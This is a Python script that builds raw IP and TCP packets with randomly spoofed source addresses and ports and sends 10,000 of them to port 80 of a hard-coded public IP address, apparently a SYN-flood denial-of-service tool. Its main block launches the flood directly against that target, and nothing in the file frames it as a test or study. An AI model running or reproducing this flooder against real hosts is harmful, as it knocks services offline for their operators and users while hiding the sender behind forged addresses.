import socket
import struct
import random
import errno
import sys
from IP_header import IP_Header
from TCP_header import TCP_Header

def randomizer() -> list :
    src_ip = ''
    #dest_ip = ''
    src_port =''
    dest_port = ''
    for i in range(4):
        random.seed()
        src_ip += str(random.randint(0, 255))
        src_ip += '.'

    src_ip = src_ip[:-1]
    random.seed()
    src_port = str(random.randint(80, 65535))
    random.seed()
    dest_port = str(80)#str(random.randint(80, 65535))
    return [src_ip, src_port, dest_port]

def trigger(dest):
    info_list = randomizer()
    ip_H = IP_Header(info_list[0], dest)
    tcp_H = TCP_Header(info_list[0], dest, int(info_list[1]), int(info_list[2]), 0, 0)

    for i in range(10000):
        try:
            socket_tunnel = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except Exception as e:
            print("Something Wrong !!!")
            sys.exit()
        socket_tunnel.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        tmp = randomizer()
        package = ip_H.get_IP_header(tmp[0], dest) + tcp_H.get_TCP_header(tmp[0], dest, int(tmp[1]), int(tmp[2]))
        print(tmp[0])
        #print(package)
        socket_tunnel.sendto(package, (dest, int(tmp[2])))



if __name__ == '__main__':
   trigger('45.77.238.196')